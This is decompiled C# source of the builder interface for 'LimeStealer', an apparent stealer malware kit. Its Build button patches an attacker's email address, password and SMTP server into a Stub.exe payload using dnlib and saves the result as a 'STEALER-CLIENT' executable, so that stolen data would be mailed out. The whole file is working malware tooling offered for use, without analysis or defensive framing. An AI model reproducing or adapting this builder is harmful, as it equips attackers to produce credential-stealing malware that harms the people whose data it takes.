using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MetroFramework.Controls;
using MetroFramework.Forms;

namespace LimeStealer
{
	// Token: 0x02000002 RID: 2
	public class Form1 : MetroForm
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002068 File Offset: 0x00000268
		private void MetroButton1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrWhiteSpace(this.txtEmail.Text) || string.IsNullOrWhiteSpace(this.txtPass.Text) || string.IsNullOrWhiteSpace(this.txtSmtp.Text))
			{
				return;
			}
			try
			{
				using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub.exe", null))
				{
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = ".exe (*.exe)|*.exe";
						saveFileDialog.InitialDirectory = Application.StartupPath;
						saveFileDialog.OverwritePrompt = false;
						saveFileDialog.FileName = "STEALER-CLIENT";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							foreach (TypeDef typeDef in moduleDefMD.Types)
							{
								foreach (MethodDef methodDef in typeDef.Methods)
								{
									if (methodDef.Body != null)
									{
										for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
										{
											if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
											{
												if (methodDef.Body.Instructions[i].Operand.ToString() == "%EMAIL%")
												{
													methodDef.Body.Instructions[i].Operand = this.txtEmail.Text;
												}
												if (methodDef.Body.Instructions[i].Operand.ToString() == "%PASS%")
												{
													methodDef.Body.Instructions[i].Operand = this.txtPass.Text;
												}
												if (methodDef.Body.Instructions[i].Operand.ToString() == "%SMTP%")
												{
													methodDef.Body.Instructions[i].Operand = this.txtSmtp.Text;
												}
											}
										}
									}
								}
							}
							moduleDefMD.Write(saveFileDialog.FileName);
							moduleDefMD.Dispose();
							MessageBox.Show("Done!", "LimeStealer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "LimeStealer", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002358 File Offset: 0x00000558
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002378 File Offset: 0x00000578
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			this.metroLabel1 = new MetroLabel();
			this.metroPanel1 = new MetroPanel();
			this.metroButton1 = new MetroButton();
			this.txtSmtp = new MetroTextBox();
			this.txtPass = new MetroTextBox();
			this.txtEmail = new MetroTextBox();
			this.metroLabel4 = new MetroLabel();
			this.metroLabel3 = new MetroLabel();
			this.metroLabel2 = new MetroLabel();
			this.metroProgressSpinner1 = new MetroProgressSpinner();
			this.metroPanel1.SuspendLayout();
			base.SuspendLayout();
			this.metroLabel1.AutoSize = true;
			this.metroLabel1.Dock = DockStyle.Bottom;
			this.metroLabel1.Location = new Point(20, 471);
			this.metroLabel1.Name = "metroLabel1";
			this.metroLabel1.Size = new Size(32, 19);
			this.metroLabel1.Style = 5;
			this.metroLabel1.TabIndex = 0;
			this.metroLabel1.Text = "v0.1";
			this.metroLabel1.Theme = 2;
			this.metroPanel1.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			this.metroPanel1.BorderStyle = 1;
			this.metroPanel1.Controls.Add(this.metroButton1);
			this.metroPanel1.Controls.Add(this.txtSmtp);
			this.metroPanel1.Controls.Add(this.txtPass);
			this.metroPanel1.Controls.Add(this.txtEmail);
			this.metroPanel1.Controls.Add(this.metroLabel4);
			this.metroPanel1.Controls.Add(this.metroLabel3);
			this.metroPanel1.Controls.Add(this.metroLabel2);
			this.metroPanel1.HorizontalScrollbarBarColor = true;
			this.metroPanel1.HorizontalScrollbarHighlightOnWheel = false;
			this.metroPanel1.HorizontalScrollbarSize = 10;
			this.metroPanel1.Location = new Point(23, 99);
			this.metroPanel1.Name = "metroPanel1";
			this.metroPanel1.Size = new Size(573, 369);
			this.metroPanel1.Style = 5;
			this.metroPanel1.TabIndex = 1;
			this.metroPanel1.Theme = 2;
			this.metroPanel1.VerticalScrollbarBarColor = true;
			this.metroPanel1.VerticalScrollbarHighlightOnWheel = false;
			this.metroPanel1.VerticalScrollbarSize = 10;
			this.metroButton1.Location = new Point(355, 269);
			this.metroButton1.Name = "metroButton1";
			this.metroButton1.Size = new Size(116, 41);
			this.metroButton1.Style = 5;
			this.metroButton1.TabIndex = 8;
			this.metroButton1.Text = "Build";
			this.metroButton1.Theme = 2;
			this.metroButton1.Click += this.MetroButton1_Click;
			this.txtSmtp.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
			this.txtSmtp.FontSize = 2;
			this.txtSmtp.Location = new Point(180, 186);
			this.txtSmtp.Multiline = true;
			this.txtSmtp.Name = "txtSmtp";
			this.txtSmtp.Size = new Size(354, 40);
			this.txtSmtp.Style = 5;
			this.txtSmtp.TabIndex = 7;
			this.txtSmtp.Text = "smtp.gmail.com";
			this.txtSmtp.Theme = 2;
			this.txtPass.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
			this.txtPass.FontSize = 2;
			this.txtPass.Location = new Point(180, 121);
			this.txtPass.Multiline = true;
			this.txtPass.Name = "txtPass";
			this.txtPass.Size = new Size(354, 40);
			this.txtPass.Style = 5;
			this.txtPass.TabIndex = 6;
			this.txtPass.Theme = 2;
			this.txtEmail.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
			this.txtEmail.FontSize = 2;
			this.txtEmail.Location = new Point(180, 56);
			this.txtEmail.Multiline = true;
			this.txtEmail.Name = "txtEmail";
			this.txtEmail.Size = new Size(354, 40);
			this.txtEmail.Style = 5;
			this.txtEmail.TabIndex = 5;
			this.txtEmail.Theme = 2;
			this.metroLabel4.AutoSize = true;
			this.metroLabel4.FontSize = 2;
			this.metroLabel4.FontWeight = 1;
			this.metroLabel4.Location = new Point(22, 199);
			this.metroLabel4.Name = "metroLabel4";
			this.metroLabel4.Size = new Size(62, 25);
			this.metroLabel4.Style = 5;
			this.metroLabel4.TabIndex = 4;
			this.metroLabel4.Text = "-Smtp";
			this.metroLabel4.Theme = 2;
			this.metroLabel3.AutoSize = true;
			this.metroLabel3.FontSize = 2;
			this.metroLabel3.FontWeight = 1;
			this.metroLabel3.Location = new Point(22, 134);
			this.metroLabel3.Name = "metroLabel3";
			this.metroLabel3.Size = new Size(95, 25);
			this.metroLabel3.Style = 5;
			this.metroLabel3.TabIndex = 3;
			this.metroLabel3.Text = "-Password";
			this.metroLabel3.Theme = 2;
			this.metroLabel2.AutoSize = true;
			this.metroLabel2.FontSize = 2;
			this.metroLabel2.FontWeight = 1;
			this.metroLabel2.Location = new Point(22, 69);
			this.metroLabel2.Name = "metroLabel2";
			this.metroLabel2.Size = new Size(61, 25);
			this.metroLabel2.Style = 5;
			this.metroLabel2.TabIndex = 2;
			this.metroLabel2.Text = "-Email";
			this.metroLabel2.Theme = 2;
			this.metroProgressSpinner1.Location = new Point(179, 17);
			this.metroProgressSpinner1.Maximum = 100;
			this.metroProgressSpinner1.Name = "metroProgressSpinner1";
			this.metroProgressSpinner1.Size = new Size(25, 25);
			this.metroProgressSpinner1.Style = 5;
			this.metroProgressSpinner1.TabIndex = 2;
			this.metroProgressSpinner1.Theme = 2;
			base.AutoScaleDimensions = new SizeF(9f, 20f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(619, 510);
			base.Controls.Add(this.metroProgressSpinner1);
			base.Controls.Add(this.metroPanel1);
			base.Controls.Add(this.metroLabel1);
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Form1";
			base.Style = 5;
			this.Text = "Lime Stealer";
			base.Theme = 2;
			this.metroPanel1.ResumeLayout(false);
			this.metroPanel1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000001 RID: 1
		private IContainer components;

		// Token: 0x04000002 RID: 2
		private MetroLabel metroLabel1;

		// Token: 0x04000003 RID: 3
		private MetroPanel metroPanel1;

		// Token: 0x04000004 RID: 4
		private MetroLabel metroLabel4;

		// Token: 0x04000005 RID: 5
		private MetroLabel metroLabel3;

		// Token: 0x04000006 RID: 6
		private MetroLabel metroLabel2;

		// Token: 0x04000007 RID: 7
		private MetroTextBox txtSmtp;

		// Token: 0x04000008 RID: 8
		private MetroTextBox txtPass;

		// Token: 0x04000009 RID: 9
		private MetroTextBox txtEmail;

		// Token: 0x0400000A RID: 10
		private MetroProgressSpinner metroProgressSpinner1;

		// Token: 0x0400000B RID: 11
		private MetroButton metroButton1;
	}
}
